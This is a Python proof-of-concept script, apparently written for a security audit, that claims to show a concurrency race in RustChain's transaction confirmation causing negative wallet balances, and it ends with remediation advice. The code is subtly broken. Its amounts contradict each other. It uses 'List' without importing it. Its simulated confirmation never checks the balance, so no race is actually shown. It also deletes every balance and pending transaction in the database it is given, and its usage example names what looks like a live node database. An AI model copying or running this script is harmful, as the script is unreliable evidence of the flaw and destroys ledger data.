#!/usr/bin/env python3
"""
PoC: Balance Underflow on Concurrent Confirmation (TX-002)
==========================================================

This PoC demonstrates a race condition in confirm_transaction() that
can cause negative balances when two transactions from the same sender
are confirmed concurrently.

Attack Scenario:
1. Wallet has 1000 RTC.
2. Tx1 (800 RTC) and Tx2 (800 RTC) both confirmed in same block.
3. If confirmations interleave: both read balance=1000, both subtract.
4. Final balance = 1000 - 800 - 800 = -600.

Impact: Currency inflation, systemic insolvency.

Usage:
    python3 poc_balance_underflow.py --db /root/rustchain/rustchain_v2.db

Note: This is a direct DB manipulation test, bypassing the API.
"""

import sqlite3
import threading
import time

def setup_test_db(db_path: str):
    """Create test wallet with 1000 RTC and two pending transactions."""
    conn = sqlite3.connect(db_path)
    try:
        conn.execute("""
            CREATE TABLE IF NOT EXISTS balances (
                wallet TEXT PRIMARY KEY,
                balance_urtc INTEGER NOT NULL,
                wallet_nonce INTEGER DEFAULT 0
            )
        """)
        conn.execute("""
            CREATE TABLE IF NOT EXISTS pending_transactions (
                tx_hash TEXT PRIMARY KEY,
                from_addr TEXT NOT NULL,
                to_addr TEXT NOT NULL,
                amount_urtc INTEGER NOT NULL,
                nonce INTEGER NOT NULL,
                timestamp INTEGER NOT NULL,
                memo TEXT DEFAULT '',
                signature TEXT NOT NULL,
                public_key TEXT NOT NULL,
                created_at INTEGER NOT NULL,
                status TEXT DEFAULT 'pending'
            )
        """)
        # Clear existing
        conn.execute("DELETE FROM balances")
        conn.execute("DELETE FROM pending_transactions")

        # Insert test wallet
        wallet = "RTC" + "x" * 64
        conn.execute("INSERT INTO balances (wallet, balance_urtc) VALUES (?, ?)",
                     (wallet, 1_000_000_000))  # 10 RTC

        # Insert two pending transactions (both spending 800 RTC)
        now = int(time.time())
        for i in range(2):
            tx_hash = f"tx{i:032x}"
            conn.execute("""
                INSERT INTO pending_transactions
                (tx_hash, from_addr, to_addr, amount_urtc, nonce, timestamp,
                 memo, signature, public_key, created_at, status)
                VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, 'pending')
            """, (tx_hash, wallet, "RTC" + "y" * 64, 800_000_000, i+1, now,
                  "Test", "SIG", "PUB", now))
        conn.commit()
        print(f"[+] Setup complete: wallet={wallet}, balance=1,000,000,000 uRTC")
        print(f"[+] Two pending txs: 800,000,000 uRTC each")
        return wallet
    finally:
        conn.close()

def confirm_tx(db_path: str, tx_hash: str, block_height: int, block_hash: str) -> bool:
    """Simulate confirm_transaction() from rustchain_tx_handler.py (UNAUDITED version)."""
    conn = sqlite3.connect(db_path)
    try:
        cursor = conn.cursor()
        # Get pending transaction
        cursor.execute(
            "SELECT * FROM pending_transactions WHERE tx_hash = ?",
            (tx_hash,)
        )
        row = cursor.fetchone()
        if not row:
            print(f"[!] TX {tx_hash[:8]} not found in pending")
            return False

        # Extract values (matching schema order)
        (tx_hash, from_addr, to_addr, amount_urtc, nonce, timestamp,
         memo, signature, public_key, created_at, status) = row

        # Update sender balance (potential underflow)
        cursor.execute(
            "UPDATE balances SET balance_urtc = balance_urtc - ? WHERE wallet = ?",
            (amount_urtc, from_addr)
        )

        # Update receiver
        cursor.execute(
            "INSERT INTO balances (wallet, balance_urtc) VALUES (?, ?) "
            "ON CONFLICT(wallet) DO UPDATE SET balance_urtc = balance_urtc + ?",
            (to_addr, amount_urtc, amount_urtc)
        )

        # Remove pending
        cursor.execute("DELETE FROM pending_transactions WHERE tx_hash = ?", (tx_hash,))
        conn.commit()
        print(f"[+] Confirmed {tx_hash[:8]}: {from_addr[:8]} -> {to_addr[:8]} amount={amount_urtc}")
        return True
    except Exception as e:
        print(f"[!] Error confirming {tx_hash[:8]}: {e}")
        conn.rollback()
        return False
    finally:
        conn.close()

def concurrent_confirm_race(db_path: str, tx_hashes: List[str]):
    """Confirm two transactions concurrently to trigger race condition."""
    results = {}
    def worker(tx_hash, idx):
        results[idx] = confirm_tx(db_path, tx_hash, 100, f"block{idx}")

    threads = []
    for i, tx_hash in enumerate(tx_hashes):
        t = threading.Thread(target=worker, args=(tx_hash, i))
        threads.append(t)
        t.start()

    for t in threads:
        t.join()

    # Check final balance
    conn = sqlite3.connect(db_path)
    try:
        balance = conn.execute(
            "SELECT balance_urtc FROM balances WHERE wallet LIKE 'RTC%x%'"
        ).fetchone()
        if balance:
            balance_val = balance[0]
            print(f"\n[*] Final balance: {balance_val} uRTC")
            if balance_val < 200_000_000:
                print("[!] VULNERABILITY CONFIRMED: Balance is below expected!")
            else:
                print("[+] Balance appears healthy")
    finally:
        conn.close()

    return results

def main():
    import argparse
    parser = argparse.ArgumentParser(description="Balance Underflow PoC")
    parser.add_argument("--db", required=True, help="Database path")
    args = parser.parse_args()

    print("=" * 70)
    print("Balance Underflow PoC — RustChain Transaction Concurrency")
    print("=" * 70)

    wallet = setup_test_db(args.db)

    # Fetch the two pending tx hashes
    conn = sqlite3.connect(args.db)
    try:
        rows = conn.execute(
            "SELECT tx_hash FROM pending_transactions WHERE from_addr = ? ORDER BY nonce",
            (wallet,)
        ).fetchall()
        tx_hashes = [r[0] for r in rows]
        print(f"[*] Found {len(tx_hashes)} pending transactions")
    finally:
        conn.close()

    print("[*] Starting concurrent confirmation (2 threads)...")
    results = concurrent_confirm_race(args.db, tx_hashes)

    print("\n[+] Test complete")
    print("[+] Expected with proper locking: First tx succeeds, second fails due to insufficient balance")
    print("[+] Vulnerable behavior: Both may succeed, resulting in negative balance")

    print("\n" + "=" * 70)
    print("Remediation:")
    print("1. Wrap confirm_transaction in BEGIN EXCLUSIVE")
    print("2. Add CHECK(balance_urtc >= 0) to balances table")
    print("3. Re-validate balance availability before deduction")
    print("=" * 70)

if __name__ == "__main__":
    main()
